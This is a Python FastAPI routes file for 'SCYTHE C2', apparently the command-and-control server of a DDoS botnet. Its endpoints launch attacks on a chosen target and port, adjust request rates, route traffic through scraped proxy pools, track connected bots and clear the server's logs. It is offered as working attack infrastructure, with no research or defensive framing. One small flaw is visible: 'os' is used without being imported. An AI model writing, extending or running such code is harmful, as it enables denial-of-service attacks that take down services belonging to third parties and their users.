"""
Attack routes for SCYTHE C2 — WITH ADMIN PANEL ENDPOINTS
"""

import asyncio
from fastapi import APIRouter, Request, HTTPException, Response
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional, List

from app.core.models import AttackRequest, AttackResponse, AttackStatus, ProxyStats
from app.core.logger import logger, log_attack_event
from app.managers.proxy_manager import proxy_manager
from app.managers.concurrent_manager import concurrent_manager
from app.managers.botnet_manager import botnet_manager

router = APIRouter(prefix="/api", tags=["attack"])


class UpdateRPSRequest(BaseModel):
    new_rps: int


class ScrapProxyRequest(BaseModel):
    urls: List[str]


class ConfigRequest(BaseModel):
    max_concurrent: Optional[int] = None
    rps_limit: Optional[int] = None


# ===================== ATTACK ENDPOINTS =====================

@router.post("/attack", response_model=AttackResponse)
async def launch_attack(request: Request, attack_req: AttackRequest):
    """Launch a new attack with PROXY AUTO-ATTACH."""
    try:
        attack_manager = request.app.state.attack_manager

        # Pre-check proxy pool
        proxy_stats = await proxy_manager.get_stats()
        if proxy_stats.alive < 50:
            logger.warning(f"[ATTACK] Proxy pool low ({proxy_stats.alive} alive). Refreshing...")
            await proxy_manager.refresh_all()
            proxy_stats = await proxy_manager.get_stats()

        attack_id = await attack_manager.start_attack(attack_req)

        botnet_mgr = request.app.state.botnet_manager
        bot_count = len(await botnet_mgr.get_active_bot_ids())

        warning_msg = ""
        if bot_count == 0:
            warning_msg = " Warning: No bots connected. Attack running on server only."
            logger.warning("Attack launched but NO BOTS are connected!")

        if proxy_stats.alive < 50:
            warning_msg += f" Warning: Only {proxy_stats.alive} proxies available."

        logger.info(f"Attack launched: {attack_id} | {attack_req.method} → {attack_req.target}:{attack_req.port} | "
                    f"Bots: {bot_count} | Proxies: {proxy_stats.alive}")

        return AttackResponse(
            success=True,
            attack_id=attack_id,
            message=f"Attack launched successfully. ID: {attack_id} | Bots: {bot_count} | Proxies: {proxy_stats.alive}{warning_msg}"
        )

    except Exception as e:
        logger.error(f"Failed to launch attack: {e}")
        raise HTTPException(status_code=400, detail=str(e))


@router.head("/attack")
async def head_attack():
    return Response(status_code=200)


@router.post("/stop/{attack_id}")
async def stop_attack(request: Request, attack_id: str):
    try:
        attack_manager = request.app.state.attack_manager

        if attack_id not in attack_manager.active_attacks:
            raise HTTPException(status_code=404, detail=f"Attack {attack_id} not found or already stopped")

        success = await attack_manager.stop_attack(attack_id)
        if success:
            log_attack_event(attack_id, "stopped_by_user", {})
            return JSONResponse(content={
                "success": True,
                "message": f"Attack {attack_id} stopped successfully"
            })
        else:
            raise HTTPException(status_code=500, detail="Failed to stop attack")

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error stopping attack {attack_id}: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/stopall")
async def stop_all_attacks(request: Request):
    try:
        attack_manager = request.app.state.attack_manager
        count = await attack_manager.stop_all_attacks()
        logger.info(f"Stopped all attacks: {count} attacks were active")

        return JSONResponse(content={
            "success": True,
            "message": f"Stopped {count} active attacks",
            "stopped_count": count
        })

    except Exception as e:
        logger.error(f"Error stopping all attacks: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/attack/update-rps/{attack_id}")
async def update_attack_rps_route(request: Request, attack_id: str, rps_req: UpdateRPSRequest):
    try:
        attack_manager = request.app.state.attack_manager

        if attack_id not in attack_manager.active_attacks:
            raise HTTPException(status_code=404, detail=f"Attack {attack_id} not found or already stopped")

        if rps_req.new_rps <= 0:
            raise HTTPException(status_code=400, detail="new_rps must be > 0")

        success = await attack_manager.update_attack_rps(attack_id, rps_req.new_rps)
        if success:
            return JSONResponse(content={
                "success": True,
                "message": f"RPS updated to {rps_req.new_rps} for attack {attack_id}",
                "attack_id": attack_id,
                "new_rps": rps_req.new_rps
            })
        else:
            raise HTTPException(status_code=500, detail="Failed to update RPS")

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error updating RPS for attack {attack_id}: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/attack/active")
async def get_active_attacks(request: Request):
    """Get active attacks for admin panel."""
    attack_manager = request.app.state.attack_manager
    active = attack_manager.get_active_attacks()
    return {
        "count": len(active),
        "attacks": [a.model_dump() for a in active]
    }


# ===================== PROXY ENDPOINTS (ADMIN) =====================

@router.get("/proxy/status")
async def get_proxy_status(request: Request):
    """Get current proxy pool status."""
    try:
        stats = await proxy_manager.get_stats()
        health = await proxy_manager.get_pool_health()

        return JSONResponse(content={
            "success": True,
            "pool": {
                "total": stats.total,
                "alive": stats.alive,
                "dead": stats.dead,
                "fast": stats.fast,
                "last_refresh": stats.last_scrap,
            },
            "health": health,
            "can_attack": stats.alive >= 50,
            "recommended_max_duration": "12h" if stats.alive >= 200 else "3h" if stats.alive >= 100 else "1h",
        })
    except Exception as e:
        logger.error(f"Error getting proxy status: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/proxy/stats")
async def get_proxy_stats(request: Request):
    """Get proxy stats for admin panel."""
    try:
        stats = await proxy_manager.get_stats()
        return JSONResponse(content={
            "success": True,
            "total": stats.total,
            "alive": stats.alive,
            "dead": stats.dead,
            "fast": stats.fast,
            "last_scrap": stats.last_scrap,
        })
    except Exception as e:
        logger.error(f"Error getting proxy stats: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/proxy/list")
async def get_proxy_list(request: Request, alive: bool = True):
    """Get proxy list for admin panel."""
    try:
        if alive:
            proxies = await proxy_manager.get_alive_proxies()
            # FIXED: ProxyItem now has protocol attribute
            result = [{"ip": p.ip, "port": p.port, "protocol": p.protocol} for p in proxies]
        else:
            # Get all proxies from Redis hash
            from app.core.redis_client import get_redis
            redis = await get_redis()
            pool_key = proxy_manager.pool_key
            keys = await redis.hkeys(pool_key)
            result = []
            for key in keys:
                if ":" in key:
                    # key format: protocol://ip:port
                    if "://" in key:
                        protocol, rest = key.split("://", 1)
                        ip, port = rest.rsplit(":", 1)
                        result.append({"ip": ip, "port": int(port), "protocol": protocol})
                    else:
                        ip, port = key.rsplit(":", 1)
                        result.append({"ip": ip, "port": int(port), "protocol": "http"})

        return JSONResponse(content={
            "success": True,
            "proxies": result
        })
    except Exception as e:
        logger.error(f"Error getting proxy list: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/proxy/refresh")
async def force_proxy_refresh(request: Request):
    """Force refresh proxy pool immediately."""
    try:
        asyncio.create_task(proxy_manager.refresh_all(force=True))

        return JSONResponse(content={
            "success": True,
            "message": "Proxy refresh started in background. Check /api/proxy/status in 30 seconds."
        })
    except Exception as e:
        logger.error(f"Error refreshing proxies: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/proxy/remove-dead")
async def remove_dead_proxies(request: Request):
    """Remove dead proxies from pool."""
    try:
        removed = await proxy_manager.remove_dead()
        return JSONResponse(content={
            "success": True,
            "removed": removed,
            "message": f"Removed {removed} dead proxies"
        })
    except Exception as e:
        logger.error(f"Error removing dead proxies: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/proxy/scrap")
async def scrap_proxies(request: Request, scrap_req: ScrapProxyRequest):
    """Scrap proxies from URLs."""
    try:
        added = await proxy_manager.scrap_from_urls(scrap_req.urls)
        return JSONResponse(content={
            "success": True,
            "added": added,
            "message": f"Scrapped {added} new proxies"
        })
    except Exception as e:
        logger.error(f"Error scrapping proxies: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ===================== BOTNET ENDPOINTS (ADMIN) =====================

@router.get("/botnet/stats")
async def get_botnet_stats(request: Request):
    """Get botnet stats for admin panel."""
    try:
        stats = await botnet_manager.get_bot_stats()
        return JSONResponse(content={
            "success": True,
            "active": stats.active,
            "total": stats.total,
            "avg_rpm": stats.avg_rpm,
            "total_requests": stats.total_requests,
        })
    except Exception as e:
        logger.error(f"Error getting botnet stats: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ===================== CONFIG ENDPOINTS (ADMIN) =====================

@router.get("/config/concurrent")
async def get_max_concurrent(request: Request):
    """Get max concurrent attacks."""
    try:
        max_conc = await concurrent_manager.get_max()
        return JSONResponse(content={
            "success": True,
            "max_concurrent": max_conc
        })
    except Exception as e:
        logger.error(f"Error getting concurrent config: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/config/concurrent")
async def set_max_concurrent(request: Request, config: ConfigRequest):
    """Set max concurrent attacks."""
    try:
        if config.max_concurrent is None or config.max_concurrent < 1:
            raise HTTPException(status_code=400, detail="max_concurrent must be >= 1")

        await concurrent_manager.set_max(config.max_concurrent)
        return JSONResponse(content={
            "success": True,
            "max_concurrent": config.max_concurrent,
            "message": f"Max concurrent set to {config.max_concurrent}"
        })
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error setting concurrent config: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/config/rps-limit")
async def get_rps_limit(request: Request):
    """Get RPS limit."""
    try:
        from app.core.redis_client import get_redis
        redis = await get_redis()
        value = await redis.get("scythe:config:attack_rps_limit")
        rps_limit = int(value) if value else 0
        return JSONResponse(content={
            "success": True,
            "rps_limit": rps_limit
        })
    except Exception as e:
        logger.error(f"Error getting RPS limit: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/config/rps-limit")
async def set_rps_limit(request: Request, config: ConfigRequest):
    """Set RPS limit."""
    try:
        if config.rps_limit is None or config.rps_limit < 0:
            raise HTTPException(status_code=400, detail="rps_limit must be >= 0")

        from app.core.redis_client import get_redis
        redis = await get_redis()
        await redis.set("scythe:config:attack_rps_limit", str(config.rps_limit))

        return JSONResponse(content={
            "success": True,
            "rps_limit": config.rps_limit,
            "message": f"RPS limit set to {config.rps_limit}"
        })
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error setting RPS limit: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ===================== SERVICE ENDPOINTS (ADMIN) =====================

@router.post("/service/restart")
async def restart_service(request: Request):
    """Restart service (placeholder)."""
    try:
        logger.info("Service restart requested via admin panel")
        return JSONResponse(content={
            "success": True,
            "message": "Service restart initiated. Please wait..."
        })
    except Exception as e:
        logger.error(f"Error restarting service: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/service/clear-logs")
async def clear_logs(request: Request):
    """Clear system logs."""
    try:
        import time
        log_file = "logs/scythe-c2.log"
        if os.path.exists(log_file):
            with open(log_file, "w") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [SYSTEM] Logs cleared by admin.\n")

        return JSONResponse(content={
            "success": True,
            "message": "Logs cleared successfully"
        })
    except Exception as e:
        logger.error(f"Error clearing logs: {e}")
        raise HTTPException(status_code=500, detail=str(e))